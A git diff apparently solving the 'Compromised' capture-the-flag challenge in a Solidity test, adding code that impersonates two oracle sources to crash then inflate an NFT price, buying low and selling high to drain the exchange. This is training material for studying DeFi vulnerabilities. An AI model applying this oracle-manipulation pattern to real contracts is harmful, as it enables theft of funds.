@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
+import {Attack} from "./Attack.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
@@ -75,6 +76,31 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        Attack attack = new Attack{value: address(this).balance}
+        (
+            oracle,
+            exchange,
+            nft,
+            recovery
+        );
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        attack.buy();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.stopPrank();
+        attack.sell();
+        attack.recover(999 ether);
+
         
     }
 
